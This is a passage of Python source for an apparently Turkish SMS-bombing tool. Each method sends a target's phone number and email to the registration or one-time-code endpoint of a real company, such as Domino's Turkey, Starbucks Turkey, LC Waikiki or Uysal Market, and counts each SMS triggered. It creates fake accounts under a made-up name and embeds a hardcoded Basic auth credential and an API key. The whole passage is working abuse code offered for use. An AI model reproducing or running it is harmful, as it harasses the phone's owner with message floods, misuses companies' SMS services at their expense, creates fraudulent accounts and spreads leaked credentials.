                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> toptanteslim.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> toptanteslim.com")

    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"Content-Type": "application/json"}
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")

    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")

    def YilmazTicaret(self):
        try:
            url = "http://www.yilmazticaret.net:80/restapi2/register/"
            headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
            data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("giris") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")

    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json, timeout=6)
            if r.json().get("success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")

    def Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": self.country_code, "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": self.country_code, "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")

    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            headers = {"Content-Type": "application/json"}
            json={"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": self.mail, "preferredName": "Memati"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("code") == 50:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> auth.sbuxtr.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> auth.sbuxtr.com")

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")

    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json"}
            json={"AppVersion": "1.3.2", "AreaCode": int(self.country_code), "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("Control") == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> crmmobil.baydoner.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> crmmobil.baydoner.com")

    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Content-Type": "application/json"}
            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")

    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Content-Type": "application/json"}
            json={"areaCode": self.country_code, "etkContract": True, "language": "TR", "phoneNumber": self.country_code+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("processStatus") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")

    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"}
            json={"gsm": f"+{self.country_code}"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")

    def LcWaikiki(self):
        try:
            url = "https://www.lcw.com/tr/ajax/authentication/preregister"
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/json",
                "origin": "https://www.lcw.com",
                "referer": "https://www.lcw.com/uye-ol",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
            }
            json_data = {
                "RegisterFormView": {
                    "RegisterPhoneNumber": self.phone,
                    "RegisterEmail": self.mail,
                    "Password": "31ABC..abc31",
                    "IsEmailChecked": False,
                    "IsSmsChecked": True,
                    "IsCallChecked": False,
                    "IsMemberPrivacyRequired": True,
                    "IsExplicitConsent": True,
                    "ActivationCode": "",
                    "CaptchaCode": "",
                    "PhoneAreaCode": f"00{self.country_code}",
                    "Referer": None,
                    "RecaptchaToken": ""
                }
            }
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> lcw.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> lcw.com")
